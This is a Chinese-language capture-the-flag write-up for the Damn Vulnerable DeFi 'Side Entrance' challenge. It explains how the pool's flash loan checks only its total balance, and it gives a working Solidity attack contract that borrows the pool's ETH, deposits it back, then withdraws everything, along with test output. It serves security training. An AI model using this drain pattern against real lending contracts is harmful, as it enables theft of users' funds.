## 题目 [Side Entrance](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/side-entrance)
一个非常简单的资金池允许任何人存入 ETH，并在任何时间提取。  

该池已经有 1000 ETH的余额，并且为了推广他们的系统，正在提供免费的闪电贷。  

你开始时有 1 ETH 的余额。通过将池中的所有 ETH 救出并存入指定的恢复账户来完成挑战。  

## 合约分析
只有一个 `SideEntranceLenderPool` 合约，和上题类似，该合约实现了一个非标准的闪电贷方法。`IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();` 但只能回调借贷合约的 `execute` 方法，并且借贷的是主网币。  
``` solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```
此外，这个合约同时实现了简单的存款和取款函数。  
``` solidity
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}

function withdraw() external {
    uint256 amount = balances[msg.sender];

    delete balances[msg.sender];
    emit Withdraw(msg.sender, amount);

    SafeTransferLib.safeTransferETH(msg.sender, amount);
}
```
**问题分析：** 该合约的闪电贷仅仅检查了合约调用前后的余额差异，并没有严格要求借贷的金额和利息在 `execute` 回调中被立即返还。这使得我们可以利用闪电贷借出的 ETH，立即通过 `deposit` 函数存回合约中。这满足了闪电贷的余额检查，同时也增加了我们在合约中的余额。然后，我们可以通过调用 `withdraw` 函数取出所有资金。  

## 题解
攻击合约的设计思路如下：  
1. 在 attack 函数中请求闪电贷借出合约中所有的 ETH。
2. 在 execute 回调中，将借出的 ETH 存入合约。
3. 闪电贷检查通过后，从合约中提取出所有 ETH。
4. 将提取到的 ETH 转移到恢复地址。
``` solidity
contract SideEntranceAttack{
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(address _pool, address _recovery){  
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function attack() external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        payable(recovery).transfer(amount);
    }

    function execute() external payable {
        // 把闪电贷收到的钱全存回去。
        pool.deposit{value:msg.value}();
    }

    receive() external payable{}
}
```
测试调用：  
``` solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceAttack sideEntranceAttack = new SideEntranceAttack(address(pool), recovery);
    sideEntranceAttack.attack();
}
```
运行测试：  
```
forge test --mp test/side-entrance/SideEntrance.t.sol
```
运行结果：
```
Ran 2 tests for test/side-entrance/SideEntrance.t.sol:SideEntranceChallenge
[PASS] test_assertInitialState() (gas: 12975)
[PASS] test_sideEntrance() (gas: 268634)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 8.45ms (1.59ms CPU time)
```